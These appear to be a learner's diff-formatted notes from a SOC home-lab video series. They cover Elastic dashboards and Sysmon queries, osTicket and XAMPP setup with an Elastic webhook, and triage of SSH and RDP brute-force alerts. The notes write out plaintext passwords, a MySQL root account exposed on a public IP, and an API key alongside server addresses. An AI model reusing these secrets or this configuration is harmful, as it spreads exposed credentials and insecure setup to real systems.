+          Appearance > Name (got rid of everything except the actual field name)
+          [Save and Return]
+            (Drag the Panel's Window to a good size...)
+            (This Is where MyDFIR when back to the Edit Visualization the Panel's [MENU] and getting rid of some columns. then [Apply & Close]...)
+  Visualization 3
+    (click on [Create Visualization] (upper left) to make the next one...)
+    NOTE: this Visualization needs different fields for Networks
+      (MYDFIR put Query 3 into the Discovery page (in another Tab) and searched around for the fields he liked. Below are the ones he choose...)
+        Rows
+          winlog.event_data.Image
+          winlog.event_data.DestinationIp
+          winlog.event_data.SourceIp
+          winlog.event_data.DestinationPort
+        Data > Number of values: 999
+        Data > Advanced > "Group remaining values as "Other" > (slider OFF)
+          Appearance > Name (got rid of everything except the actual field name)
+          [Save and Return]
+            (Drag the Panel's Window to a good size...)
+            (MYDFIR edited the the "Image" field to EXCLUDE the MSWin Defender process, by changing the query to remove "MsMpEng.exe")
+              Query 3 (4th try) 
+                "event.code: 3  and event.provider:Microsoft-Windows-Sysmon and winlog.event_data.Initiated: true and not winlog.event_data.Image:*MsMpEng.exe
+                  (PROBLEM - I don't have the records that MyDFIR has. He has 20 records of different types, with Destination Ports of 5985, 5353, 80, 9999, and 443. I have 3 types of record, all to port 3389, but 44,000+ records of each. I'm not sure where I went wrong. in the attack? somewhere here in Elastic? I double checked my query, so thats not it. I'm going to continue on with the last Vis...)
+                    (ALSO, I'm having that stupid Settings > Edit Query problem again and I'm using "Edit in Lens" to fix it.)
+                  (SOLVED? -I removed the Vis and re-did it. I'm sure I did it the same way, but its working now. just like MyDFIR's. even the frigg'n Edit Query...)
+  Visualization 5001
+    (click on [Create Visualization] (upper left) to make the next one...)
+    NOTE: Elastic doesn't seem to allow using the message field in the Visualizations. IT IS in Discovery, though,
+      (MDFIR just used host.hostname, winlog.event_data.Product Name, and event.code with no edits at all. He did put the Message in the Description when he named this Panel)
+      NOTE: name the Panels as Follows:
+        Process Created (Powershell, CMD, RunDLL32)
+        Process Initiated Network Processes
+        Microsoft Defender Disabled
+          Description: Microsoft Defender Antivirus Real-time Protection scanning for malware and other potentially unwanted software was disabled.
+    [Save] > Save Dashboard > "MyDFIR Suspicious Activity"
+
+_____________________________________________________________________
+9/23/2024
+What is a Ticketing System? | Day 23
+  https://youtu.be/kvTCA4FQET0?feature=shared
+INTRODUCTION -A Ticketing System is a system that creates tickets and can include anything you want: an Alert, a Customer Complaint, Troubleshooting Request, Any Request. The objective is to keep track of the task at hand and have a way to have an Audit Trail and Accountability (the last "A" in A.A.A)
+  Popular Real-World Ticketing Systems
+    Jira Service Management
+    Service Now (IT Service Management ot ITSM)
+    Freshdesk
+    Zendesk
+    Salesforce Service Cloud
+  Free/Open-Source
+    osTicket -help desk / ticketing platform that can create inquiries online, through email, and through phone calls.
+      Customize Fields
+      Create Ticket Filters for routing purposes
+      Assign and Transfer Tickets
+      Option to set an SLA (Service Level Agreement)
+      Self-host for free or have them manage it for a fee (limited tool-set)
+
+_____________________________________________________________________
+9/26/2024
+osTicket Setup Tutorial | Day 24
+  https://youtu.be/xgxQuLL33oU?feature=shared
+DEPLOY -VM Server (Cloud Compute Shared CPU, Toronto) 
+  Image: Windows 2022, 55GB SSD, 1 CPU, 2GB, 2TB Bandwidth ($24/m)
+    NOTE: Steven said; "We don't need the server extremely beefy" and use the cheapest one available. Shared CPU & Regular Cloud Compute
+  Additional Features: Virtual Private Cloud 2.0 (free)
+    Name: "30-Day MyDFIR Challenge"
+    IP Address: 172.31.0.5
+  Server Setting: default ("everybody have access to the server")
+  Server Hostname & Label: MYDFIR-osTicket
+  MYDFIR-osTicket Overview
+    IP Address: 155.138.136.18
+    Username: Administrator
+    Password: .oR9ieavH!(pq59T      (yes, the 1st character is a period)
+    Netmask: 255.255.254.0
+    Gateway: 155.138.136.1
+  VERIFY Deployment -by checking if the Vultr > MYDFIR-osTicket > Console works correctly (but we're going to RDP in because it's a better experience) 
+  CONFIGURE Firewall
+    (this computer will have a WebServer, hosting the Ticketing system and the whole internet isn't allowed in)
+    Vultr > Compute > MYDFIR-osTicket > Settings > Firewall > ...30-Day MyDFIR Challenge (from the drop-down menu) > [Update Firewall Group]
+  CONNECT -to MYDFIR-osTicket by RDP with xfreerdp
+    NOTE: Bash Shell has problems with SPECIAL Characters in strings (especially exclamation marks and periods ("!" and ".") and needs it to be enclosed in SINGLE QUOTES. the Password I was assigned starts with a period so the Bash Quote to RDP in to the Windows Server is:
+      $ xfreerdp /u:Administrator /p:'.oR9ieavH!(pq59T' /v:155.138.136.18:3389
+        (took a frigg'n half hour to figure that out...) 
+DOWNLOAD XAMPP -on the Windows Server from ApacheFriends.org (v8.2.12)
+  https://www.apachefriends.org/download.html
+INSTALL XAMPP
+  NOTE: Starting the install generates a Windows UAC Warning - Click [OK]
+    (select all the defaults, but remember that the default directory is C:\xampp)
+  CONFIGURE -XAMPP to use Public IP instead of Local Host (127.0.0.1)
+    XAMPP properties in the config file with Notepad
+      C:\xampp\properties
+        apache_domainname=155.138.136.18
+    XAAMPP php admin config file with Notepad
+      C:\xampp\phpMyAdmin\config.inc.php
+        (make a backup copy first, just in case - config.inc.backup.php)
+        /* Bind to the localhost ipv4 address and tcp */
+        $cfg['Servers'][$i]['host'] = '155.138.136.18';
+    Windows Defender Firewall with Advance Security (from Windows SearchBar)
+      Inbound Rules (left side) > New Rule (right side)
+        Rule Type: Port   [Next]
+        Protocol and Ports: TCP / 80,443   [Next]
+        Action: Allow the connection   [Next]
+        Profile: (leave defaults)   [Next]
+        Name: Inbound 80,443  [Finish]
+    XAMPP Control Panel v3.3.0
+      [Start] Apache Service
+      [Start] MySQL Service
+      [Admin] Apache Service
+        (this brings up the "Welcome to XAMPP for Windows 8.2.12" page)
+          PROBLEM -the Lesson shows MyDFIR clicking on the "phpMyAdmin" Tab at the top of the Welcome page, but I only have a "Menu" (presumably with "phpMYAdmin" inside it. However Clicking on it won't open anything) 
+          TROUBLESHOOTING -I expect that my Welcome Page isn't wide enough for the Menu to show the Tabs. The Microsoft Edge Browser is already the full width of the Window, and the xfreerdp session window won't let me re-size it.
+          I'll close this session and re-establish the connection with a bigger widow
+            xfreerdp /u:Administrator /p:'.oR9ieavH!(pq59T' /w:1366 /h:768 /v:155.138.136.18:3389
+          SOLVED -the session window is much wider, and dragging the Welcome Page wider displays all the Tabs.  (Joy...)
+        phpMyAdmin > ...  
+          PROBLEM: This throws an Error:
+            "MySQL said: Documentation - Cannot connect: invalid settings.
+            ...
+            "Connection for control user as defined in your configuration failed."
+          TROUBLESHOOTING: MYDFIR found (off screen) that he had to Authorize the  Public IP to access the phpMyAdmin before changing IP address from Local  host to the Public Address
+            C:\xampp\phpMyAdmin\config.inc.php
+              /* Bind to the localhost ipv4 address and tcp */
+              $cfg['Servers'][$i]['host'] = '127.0.0.1';
+          (the phpMyAdmin GUI opened without further issue)
+            (JOY...)
+        phpMyAdmin > User Accounts > (click on the "root" Account with the Host Name of "localhost") > [Login Information]
+          Edit privileges: User account 'root'@'localhost'
+            Host name: Use text field (drop-down)
+                       155.138.136.18
+            Password: Use text field (drop-down)
+                      Winter2024!
+            [Go]          
+              "Your SQL query has been executed successfully"
+          (Change the IP in the config.inc.php file back again)
+            C:\xampp\phpMyAdmin\config.inc.php
+              /* Bind to the localhost ipv4 address and tcp */
+              $cfg['Servers'][$i]['host'] = '155.138.136.18';
+          (ALSO and we changed the password, so add that in the config.inc.ph too
+          This will be "Winter2024!" for the "root" account)
+              /* Authentication type and info */
+              $cfg['Servers'][$i]['auth_type'] = 'config';
+              $cfg['Servers'][$i]['user'] = 'root';
+              $cfg['Servers'][$i]['password'] = 'Winter2024!';
+              $cfg['Servers'][$i]['extension'] = 'mysqli';
+          (We'll ALSO need to the change the PAM access)
+              /* User for advanced features */
+              $cfg['Servers'][$i]['controluser'] = 'pma';
+              $cfg['Servers'][$i]['controlpass'] = 'Winter2024!';
+          (close and re-open the phpMyAdmin Gui. Everything "Should" by good)
+DOWNLOAD -osTicket from 
+  https://osticket.com/
+  "Self-Hosted" > Open Source > [Download] > osTicket Core, v1.18.1 > [Next Step]
+    Select Language, (no plug-ins now), and (No Thanks) to the Mailing List
+INSTALL -osTicket
+  1. Unzip the downloaded "osTicket.zip" file and the resulting zipped file "osTicket-v1.18.1.zip"
+  2. create the folder in c:\xampp\htdocs\osticket 
+    (c:\xampp\htdocs holds all the default web contents)
+  3. copy the 2 extracted folders ("scripts" and "upload") into the new folder
+  4. in the Browser, go to: 155.138.136.18/osticket/upload/setup
+    (this should show the osTicket Installer GUI)
+      (as its a webserver, it works from my Local MAL1 Laptop Browser,too)
+  NOTE: The GUI is showing that there are a number of Recommended Prerequisites that are missing: Gdlib Extension, PHP IMAP Extension, plus 3 more that MYDFIR say we aren't going to use
+    ALSO, the Configuration file is missing
+    osTicket installer requires ability to write to the configuration file, include/ost-config.php. A template copy is located in the include directory (include/ost-sampleconfig.php).
+      "Solution: Rename the sample file include/ost-sampleconfig.php to ost-config.php and click continue below."
+        C:\xampp\htdocs\osticket\upload\include\ost-sampleconfig.php
+          (change the name to ost-config.php or make a copy and rename...)
+    [Continue]
+  osTicket Basic Installation GUI       
+    System Settings
+      Helpdesk URL: http://155.138.136.18/osticket/upload/   (supplied on GUI)
+      Helpdesk Name: MyDFIR-RUDI-Support
+      Default Email : test@test.com
+    Admin User
+      First Name: RUDI
+      Last Name: MyDFIR
+      Email Address: test1@test.com 
+      Username: MyDFIR
+      Password: 30DayChallenge
+    Database Settings
+      MySQL Table Prefix: ost_
+      MySQL Hostname: 155.138.136.18
+      MySQL Database: MyDFIR-30-Day-DB
+      MySQL Username: root
+      MySQL Password: Winter2024!
+    [Install Now]
+  NOTE: this brings up an error. apparently we need to create the Database 1st
+    phpMyAdmin > New > Database > Create database
+      MyDFIR-30-Day-DB
+      utf8mb4_general_ci
+        [Create]
+    (see the MyDFIR-30-Day-DB on the left side panel...)
+  VERIFY
+    Home Icon (top left) > User account > root Account (with 155.138.136.18 host name) > Database 
+      (this shows that we DO have privileges to access this database, this should have been the case with the previous note of "Global Access")
+      (select MyDFIR-30-Day-DB from the drop-down
+      [Go]
+    Edit privileges:
+      Database-specific privileges: Check all
+  RE-INSTALL the osTicket Basic Installation GUI
+    http://155.138.136.18/osticket/upload/
+      (Microsoft Edge saved the form data from earlier, so most of the page is auto-filled)
+        [Install Now]
+          "Congratulations!
+            Your osTicket installation has been completed successfully. Your next step is to fully configure your new support ticket system for use, but before you get to it please take a minute to cleanup."
+          "Config file permission:
+            Change permission of ost-config.php to remove write access as shown below.
+              CLI:
+                chmod 0644 include/ost-config.php
+              Windows PowerShell:
+                icacls include\ost-config.php /reset
+CONFIGURE -osTicket with PowerShell (with Admin) and go to the folder with "ost-config.php"
+  PS> cd C:\xampp\htdocs\osticket\upload\include
+  PS> icacls .\ost-config.php /reset
+    (the instruction in the GUI doesn't include the "./" of the file, but needs it)
+    "Successfully processed 1 files; Failed processing 0 files"
+LOGIN
+  (according to the osTicket Installer the following are important links)
+    Your osTicket URL (for clients:
+      http://155.138.136.18/osticket/upload/  
+    Your Staff Control Panel (for agents):
+      http://155.138.136.18/osticket/upload/scp
+    osTicket Forums:
+      https://forum.osticket.com/ osTicket 
+    Documentation:
+    https://docs.osticket.com/
+  (we should be able to login fron any browser)
+    (Local) Browser > http://155.138.136.18/osticket/upload/scp
+      NOTE: Spectum blocked this: "Suspicious Site Blocked" but using the web browser in the xfreerdp session of MYDFIR-osTicket (a VM on Vultr) isn't blocked (crazy...)
+      Username: MyDFIR
+      Password: 30DayChallenge
+        (I'm in...much JOY...)
+BONUS -MyDFIR suggested playing around with osTicket and setting up an other agent. (Remember RUDI is the Admin)
+  Agent
+    Account: Henry Orbit, horbit@test.com, (212) 664-7665 ext 02,
+      username: Henry.Orbit, password: MartianMeatballs 
+    Access: Primary Dept: Support, All Access
+    Permissions: all
+
+_____________________________________________________________________
+9/27/2024
+osTicket Setup Tutorial | Day 25
+  https://youtu.be/P9YxutqWAF0?feature=shared
+INTEGRATE -osTicket into ELK tech stack
+  osTicket Staff Control Panel (http://155.138.136.18/osticket/upload/scp) > Login (MyDFIR/30DayChallenge) > Admin Panel (upper right) > Manage Tab > Select API > Add New API Key
+    IP Address: 172.31.0.3
+    Services: Can Create Tickets (XML/JSON/EMAIL) [checked]
+    Internal Notes: "MyDFIR 30 Day Elastic Connector"
+    [Add Key]
+      NOTE: Both the MyDFIR-ELK server & the MyDFIR-osTicket server are in the same VPC Network. This means they have Local Private IP Addresses in that network
+        (Vultr > Computer > MyDFIR-ELK > Settings > VPC 2.0)
+        MyDFIR-ELK server: 172.31.0.3/24
+        MyDFIR-osTicket: 172.31.0.5/24
+        MyDFIR-Fleet-Server: 172.31.0.4/24
+      API Key: BC80D2B3D4AB657D5C6AFC1D74F7C414
+        (this key is what we'll use to integrate osTicket in to ELK)
+  Elastic GUI > [Menu] > Management > Stack Management > Alerts and Insights > Connectors > [Create Connector]
+    NOTE: with the Free Elastic Account License you can't use an API as a connector. (we'll need to use the Free 30 Day Trial)
+      Select Connector > Manage License > Start a 30-day trial > [Start Trial]
+        "Start your free 30-day trial
+          This trial is for the full set of subscription features (opens in a new tab or window) of the Elastic Stack. You'll get immediate access to:
+            Machine learning
+            Alerting
+            Graph capabilities
+            JDBC and ODBC connectivity for SQL
+          Advanced security features, such as authentication (AD/LDAP, SAML, PKI, SAML/   SSO), field- and document-level security, and auditing, require configuration. See the documentation(opens in a new tab or window) for instructions."
+          [Start my trial]
+            "Your Trial license is active
+              Your license will expire on October 27, 2024 8:26 AM EDT"
+  Connectors > [Create Connector] > Webhook connector (Send a request to a web service)
+    Webhook connector
+      Compatibility: Alerting Rules
+      Connector name: osTicket
+      Connector settings
+        Method: POST
+        URL: http://155.138.136.18/osticket/upload/api/tickets.xml
+      Authentication: None
+      Add HTTP header (slider ON)
+        Headers in use
+          Key: X-API-Key
+          Value: BC80D2B3D4AB657D5C6AFC1D74F7C414
+      [Save and test] 
+        Edit connector (test)
+          1. Create and action
+              (see osTicket's Github page for a sample Body)
+                https://github.com/osTicket/osTicket/blob/develop/setup/doc/api/tickets.md
+---------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<ticket alert="true" autorespond="true" source="API">
+    <name>Angry User</name>
+    <email>api@osticket.com</email>
+    <subject>Testing API</subject>
+    <phone>318-555-8634X123</phone>
+    <message type="text/plain"><![CDATA[Message content here]]></message>
+    <attachments>
+        <file name="file.txt" type="text/plain"><![CDATA[
+            File content is here and is automatically trimmed
+        ]]></file>
+        <file name="image.gif" type="image/gif" encoding="base64">
+            R0lGODdhMAAwAPAAAAAAAP///ywAAAAAMAAwAAAC8IyPqcvt3wCcDkiLc7C0qwy
+            GHhSWpjQu5yqmCYsapyuvUUlvONmOZtfzgFzByTB10QgxOR0TqBQejhRNzOfkVJ
+            +5YiUqrXF5Y5lKh/DeuNcP5yLWGsEbtLiOSpa/TPg7JpJHxyendzWTBfX0cxOnK
+            PjgBzi4diinWGdkF8kjdfnycQZXZeYGejmJlZeGl9i2icVqaNVailT6F5iJ90m6
+            mvuTS4OK05M0vDk0Q4XUtwvKOzrcd3iq9uisF81M1OIcR7lEewwcLp7tuNNkM3u
+            Nna3F2JQFo97Vriy/Xl4/f1cf5VWzXyym7PHhhx4dbgYKAAA7
+        </file>
+    </attachments>
+    <ip>123.211.233.122</ip>
+</ticket>
+---------------------------------------------------------------------
+            (for this Lesson, we'll change <subject>Testing API</subject>) to
+            <subject>MyDFIR-30DayChallenge-RUDI</subject>
+          2. Run the test
+            [Run]
+          3. Results
+            "Test failed to run
+              The following error was found:
+                error calling webhook, invalid response
+              Details:
+                [401] Unauthorized
+          TROUBLESHOOT -network connection issue
+            1. open a Local SSH session into ELK with terminal
+              ssh root@155.138.158.83            ~ELK Server Public IP
+              ip a
+                enp1s0: (public IP...) inet: 155.138.158.83/23
+                enp8s0: (private IP...) inet: 172.31.0.3/24
+              ping 172.31.0.5                    ~osTicket Server Private IP
+                PING 172.31.0.5 (172.31.0.5) 56(84) bytes of data.
+                From 192.0.0.8 icmp_seq=1 Destination Host Unreachable
+            2. double-check that the osTicket IP is correct
+            3. open a Local RDP session in osTicket with Command Prompt (Admin)
+                (if not already established)
+              ipconfig
+                Ethernet adapter Ethernet Instance 0: 
+                  Connection-specific DNS Suffix:
+                    Link-local IPv6 Address: fe80::5400:5ff:fe1c:67af%4
+                    IPv4 Address: 155.138.136.18
+                Ethernet adapter Ethernet Instance 0 2:
+                  Connection-specific DNS Suffix:
+                    Link-local IPv6 Address: fe80::5801:5ff:fe1c:67af%5
+                    Autoconfiguration IPv4 Address: 169.254.29.32
+                      (A-HUH! looks like DHCP didn't assign an IP the 2nd network)
+            4. Change adapter settings
+              osTicket/RDP > SearchBar > Control PAnel > Network and Sharing > View network status and tasks > Change Adapter Settings > Ethernet Instance 0 2
+                (or just type ncpa.cpl)
+                Ethernet Instance 0 2 > [RC] > Properties > IPv4
+                  Use the following IP address
+                    IP address: 172.31.0.5
+                    Subnet mask: 255.255.255.0
+                      [Okay] [Okay]
+            5. double-check the configuration in CMD
+              ipconfig
+                Ethernet adapter Ethernet Instance 0: 
+                  Connection-specific DNS Suffix:
+                    Link-local IPv6 Address: fe80::5400:5ff:fe1c:67af%4
+                    IPv4 Address: 155.138.136.18
+                Ethernet adapter Ethernet Instance 0 2:
+                  Connection-specific DNS Suffix:
+                    Link-local IPv6 Address: fe80::5801:5ff:fe1c:67af%5
+                    Autoconfiguration IPv4 Address: 172.31.0.5              
+            6. double-check connection in the ELK terminal SSH session
+              ping 172.31.0.5                    ~osTicket Server Private IP
+                PING 172.31.0.5 (172.31.0.5) 56(84) bytes of data.
+                64 bytes from 172.31.0.5: icmp_seq=1 ttl=126 time=818 ms
+          VERIFY -by running the Elastic Connector Test again
+          2. Run the test
+            [Run]
+          3. Test failed to run
+            (in the Lesson MyDFIR just remembers that he need to edit the connection here too)
+          TROUBLESHOOT (more)
+            7. Edit connector > Configuration
+                Connector settings
+                  Method: POST
+                  URL: http://172.31.0.5/osticket/upload/api/tickets.xml
+                    [Save]
+          VERIFY -by running the Elastic Connector Test again
+            2. Run the test
+              [Run]
+            3. Results
+                Test was successful
+                  Ensure the results are what you expect.                   
+          VERIFY -by checking the osTicket GUI
+            Admin Control Panel > Agents (upper right)
+              (opens to Staff Control Panel > Tickets)
+              Open
+  Ticket  Last Updated       Subject                     From           Priority 
+  843106  09/27/24 02:02:20  osTicket Installed!         osTicket Team   
+  480914  09/27/24 14:44:11  MyDFIR-30DayChallenge-RUDI  Angry User     Normal
+  709650  09/27/24 14:15:20  Testing API                 Angry User     Normal
+    (the ticket #709650 was a test where I forgot to change the subject line)
+      (much JOY...)
+
+_____________________________________________________________________
+9/27/2024
+Investigate SSH Brute Force Attack | Day 26
+  https://youtu.be/sXQ1hsAFX7U?feature=shared
+INVESTIGATE SSH Security Alerts -Elastic GUI
+  Elastic GUI > [Menu] > Security > Alerts 
+    (cool, 1 have 169 alters so far today at 1:25pm on 9/27/2024)
+    NOTE: While the Lesson won't go into "Timelines", they are good ways to start an investigation. "Use Timeline as your workspace for investigations and threat hunting. You can add alerts from multiple indices to a Timeline to facilitate advanced investigations."
+      Expand the first alert and browser the contents
+        NOTE: The methodology to investigating a Brute Force attack:
+          • IP -is this IP known to perform brute force activity?
+          • Any other users affected by this IP?
+          • Were any of them successful?
+          • If so, what activity occurred after the successful login?
+      1a. SEARCH for the IP (83.222.191.62) by checking for it on aboutipdb.com
+        83.222.191.62 was found in our database!
+        This IP was reported 24,773 times. 
+        Confidence of Abuse is 100%
+          ISP: 4Media Ltd.
+          Usage Type:  Commercial
+          Domain Name: 4media.bg
+          Country:  Bulgaria
+          City:  Sofia, Sofia (stolitsa)
+      1b. SEARCH for the IP (83.222.191.62) by checking for it on greynoise.io
+          malicious, hosting
+          83.222.191.62
+            organization: ROZA HOLIDAYS EOOD
+            actor: unknown
+            Not Spoofable
+            first seen: 2024-07-10   last seen: 2024-09-27
+          country: Bulgaria   region: Pernik
+      • IP -is this IP known to perform brute force activity? 
+          YES
+      2a. SEARCH Elastic/Kibana for the IP (83.222.191.62)
+            [Menu] > Analytics > Discover > Query > 83.222.191.62  
+              checking the Available fields in the left panel, click on "user.name"
+              in this example, the only user affected was "root" 
+      • Any other users affected by this IP?
+          NO
+          (however, had I chosen a different alert and IP (i.e 193.151.133.15), the "user.name" would show the user "root" was only affected 24.2% of the time and many other users were affected, including "administrator", "admin", "adminftp", "chris", "david", etc....)
+      3.a SEARCH Elastic/Kibana with the query for accepted
+          [Menu] > Analytics > Discover > Query > 83.222.191.62 and accepted
+            (no fields matched, but double-check the query for syntax. querying just "accepted" doesn't show any matches either, but "Accepted" does. those were our IP -ALWAYS follow the process...)
+            193.151.133.15
+            Query > 83.222.191.62 and Accepted
+      • Were any of them successful?
+          NO
+      • If so, what activity occurred after the successful login?   
+          NOTHING 
+MODIFY Alert -to push to osTicket
+  Elastic GUI > [Menu] > Security > Rules > Detection rules (SIEM) > "MyDFIR-SSH-Brute-Force-Attempt-RUDI" > [Edit Rule Settings] > Actions tab > "Select a connector type" > Webhook
+    osTicket  
+      Webhook connector: osTicket
+      Action Frequency: for each alert (drop-down) 
+        "Per rule Rule" (drop-down - default)
+      Body: (using the sample test from befor, but without the "<attachment>" and "<ip>", and <name>Elastic</name>, and add some message content text)
+        (ALSO, for subject, remove "Testing API" But also add a variable...)
+        NOTE: the little "Add variable" icon at the top left of the "Body" window has a lot of choices to use (here, we picked "rule.name")
+          <?xml version="1.0" encoding="UTF-8"?>
+            <ticket alert="true" autorespond="true" source="API">
+              <name>Elastic</name>
+              <email>api@osticket.com</email>
+              <subject>{{rule.name}}</subject>
+              <phone>212-664-7665X02</phone>
+              <message type="text/plain"><![CDATA[Please Investigate the rule: {{rule.name}}]]></message>
+            </ticket>
+    [Save Change]    
+  OsTicket GUI 
+    (Cheerful Spectrum is still blocking osTicket, so RDP into a Vultr CLoad Instance of the Windows Server and use that VM's Browser...)
+    Your Staff Control Panel (for agents):
+      http://155.138.136.18/osticket/upload/scp
+        (the Lesson has a couple alerts in a couple minutes but I don't. It may be that no one is attacking right now or I messed something up. Yes, I refreshed the Elastic, and osTicket)
+        (ALSO -the Name still shows "Angry User", but at least the rule name is right...)
+    MODIFY the rule some more by adding a link to the rule with the variable "rule.url"
+      NOTE: the list of Alert notification placeholders are at:
+        https://www.elastic.co/docs/current/serverless/security/rules-create
+          <?xml version="1.0" encoding="UTF-8"?>
+            <ticket alert="true" autorespond="true" source="API">
+              <name>Elastic</name>
+              <email>api@osticket.com</email>
+              <subject>{{rule.name}}</subject>
+              <phone>212-664-7665X02</phone>
+              <message type="text/plain"><![CDATA[Please Investigate the rule: {{rule.name}}]]></message>
+            </ticket>
+      NOTE: this generates an Error
+        "server.publicBaseUrl is not set. Generated URLs will be either relative or empty."      
+        NOTE: the hover-over text from the variable is:
+        "rule.url
+        The URL to the rule that generated the alert. This will be an empty string if the server.publicBaseUrl is not set. Generated URLs will be either relative or empty."
+          (We need to re-configure the server.publicBaseUrl in the Kibana Config yaml file so Kibana will be available)
+          SSH into ELK Server
+            ssh root@155.138.158.83
+          Edit kibana.yml file
+            nano /etc/kibana/kibana.yml
+              # Specifies the public URL at which Kibana is available for end users. If
+              # `server.basePath` is configured this URL should end with the same basePath.
+              #server.publicBaseUrl: ""
+              #MAL 9/28/2024: configured to enable Rule Alert with rule.url for osTicket 
+              server.publicBaseUrl: "http://155.138.158.83:5601 "
+          Restart Kibana
+            systemctl restart kibana.service
+            systemctl status kibana.service
+    VERIFY -by checking the rule for errors
+      Elastic GUI > [Menu] > Security > Rules > Detection rules (SIEM) > "MyDFIR-SSH-Brute-Force-Attempt-RUDI" > [Edit Rule Settings] > Actions tab > Body
+        (no more errors...)
+    VERIFY -by going to osTicket and opening a reason ticket (if there is one...) and following the link to the Elastic GUI > Security >Alters
+      NOTE: the whole link is not marked-up correctly. select the whole link, right-click and use the context menu command the "Go to..."
+      NOTE: the Elastic GUI will need to be logged into from the new tab before continuing to the actual Alert
+    PROCESSES and Best Practice -for a ticket is to:
+      1. assign it to yourself (if not already assigned...) before you start working on it so that multiple team members don't duplicate the work.
+        osTicket GUI > Ticket > Assigned To:  — Unassigned — 
+          (this opens a new dialog window)
+        Assignee (drop-down) > [your user name]
+      2. follow up with servicing the ticket and post a reply
+      3. close the ticket
+        Ticket Status > (drop-down)
+    VERIFY -by checking the closed tickets (this took a couple of minutes for me before it updated...)
+
+_____________________________________________________________________
+10/1/2024
+Investigate RDP Brute Force Attack | Day 27
+  https://youtu.be/l9KA6dPdOs8?feature=shared
+CREATE RDP Security Alerts -Elastic GUI
+  Elastic GUI > [Menu] > Security > Alerts
+    (time: Last 30days, 1k+ total alerts, 963 for SSH, 727 for RDP...)
+    NOTE: hovering over Alerts by name> [rule name] brings up a small context menu. clicking on the "+" for "Filter In". this will filter for just that rule name
+    MODIFY -the existing MyDFIR-RDP-Brute-Force-Attempt-RUDI rule
+      [Menu] > Security > Rules > Detection rules (SIEM) > MyDFIR-RDP-Brute-Force-Attempt-RUDI rule > [Edit rule settings] > Actions tab > Actions > Webhook (icon)
+      (this should bring up the osTicket connector)
+        Webhook connector: osTicket
+        Action frequency: For each alert > Per Rule run
+        Body: Webhook connector
+          <?xml version="1.0" encoding="UTF-8"?>
+            <ticket alert="true" autorespond="true" source="API">
+              <name>Elastic</name>
+              <email>api@osticket.com</email>
+              <subject>{{rule.name}}</subject>
+              <phone>212-664-7665X02</phone>
+              <message type="text/plain"><![CDATA[Please Investigate the rule: {{rule.name}}
+              Link: {{rule.url}}
+              User: {{#context.alerts}}Detection alert for user: {{user.name}}{{/context.alerts}}]]></message>
+            </ticket>
+          (as a SSH rule was already created, we're just copied that body into this rule)
+        [Save changes] 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+NOTE: searching for information on the syntax of placeholders in the detection alerts brought up the following websites:
+  https://discuss.elastic.co/t/siem-detection-alerts-additional-field-adding-in-notification-placeholders/264247
+  https://github.com/elastic/kibana/pull/85488
+    "Docs update: Alert data is now available in detection rule actions at {{context.alerts}} as an array. This array contains each alert generated since the last time the action executed. Mustache templatting can be used to iterate over all alerts in the array and capture information from each one. For example, {{#context.alerts}}Detection alert for user: {{user.name}}{{/context.alerts}} would create the string Detection alert for user: <user.name> for every alert in the array. Any alerts that don't have user.name will still generate the string but leave <user.name> blank."
+  NOTE: this lead to the modified Alert Body message markup:
+    <message type="text/plain"><![CDATA[Please Investigate the rule: {{rule.name}}
+        Link: {{rule.url}}
+        Source IP: {{#context.alerts}}{{source.ip}}{{/context.alerts}}
+        User: {{#context.alerts}}{{user.name}}{{/context.alerts}}
+        Computer: {{#context.alerts}}{{host.name}}{{/context.alerts}}
+        Reason: {{#context.alerts}}{{kibana.alert.reason}}{{/context.alerts}}]]></message>
+    NOTE: to get "Computer" to work, add host.name to Edit rule settings > Definition > Group by...
+      (Reason is a little redundant, but I think I like it more than the list of Source IP, User, Computer. Maybe just Reason and Link?...)
+        (ALSO, I posted on the YouTube MYDFIR channel for the Lesson...)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+INVESTIGATE -the RDP alerts that we're already generated per methodology from Day 26
+  Expand the first alert and browser the contents
+    NOTE: The methodology to investigating a Brute Force attack:
+      • IP -is this IP known to perform brute force activity?
+      • Any other users affected by this IP?
+      • Were any of them successful?
+      • If so, what activity occurred after the successful login?
+  1a. SEARCH for the IP (185.234.216.88) by checking for it on aboutipdb.com
+    185.234.216.88 was found in our database!
+    This IP was reported 681 times. 
+    Confidence of Abuse is 100%
+      ISP: Express Courier LLC 
+      Usage Type:  Data Center/Web Hosting/Transit
+      Domain Name: expcourier.ru
+      Country:  Netherlands (Kingdom of the) 
+      City:  Amsterdam, Noord-Holland
+  1b. SEARCH for the IP (185.234.216.88) by checking for it on greynoise.io
+      malicious, hosting
+      185.234.216.88
+        organization:"Chang Way Technologies Co. Limited"
+        actor: unknown
+        Not Spoofable
+        first_seen:"2018-10-19"   last_seen:"2024-09-25"
+      country: Russia   region: Moscow
+  • IP -is this IP known to perform brute force actively? 
+      YES
+  2a. SEARCH Elastic/Kibana for the IP (185.234.216.88)
+        [Menu] > Analytics > Discover > Query > 185.234.216.88
+          (busy guy! 4662 records...)  
+          checking the Available fields in the left panel, click on "user.name"
+  • Any other users affected by this IP?
+      YES
+      (in this example, various affected users include: Administrator, user, guest, admin, user1, Guest ....)
+  3.a SEARCH Elastic/Kibana with the query for accepted
+      [Menu] > Analytics > Discover > Query > 83.222.191.62 and accepted
+        (no fields matched, but double-check the query for syntax. querying just "accepted" doesn't show any matches either, but "Accepted" does. those were our IP -ALWAYS follow the process...)
+        193.151.133.15
+        Query > 185.234.216.88 and Accepted
+          (ALSO: Query > 185.234.216.88 and event.code 4624)
+  • Were any of them successful?
+      NO
+  • If so, what activity occurred after the successful login?   
+      NOTHING
+INVESTIGATE -the Kali/Mythic Brute Force Attack from Day 21
+  (MYDFIR also ran another IP from the Kali attack, and saw a successful logon (event.code: 4624). afterwards he changed the time settings from "Browser" to "UTC" show we wouldn't leak info. the setting is in [Menu] > Management > Stack Management > Kibana > Advanced Settings > Time Zone)
+
+_____________________________________________________________________
+10/9/2024
+Investigate Mythic Agent | Day 28
+  https://youtu.be/b11TuDx_CjU?si=DO9ljTgmqWTkt72Y
+CREATE RDP Security Alerts -Elastic GUI
+
+
+
+_____________________________________________________________________
+10/10/2024
+Elastic Defend Setup Tutorial | Day 29
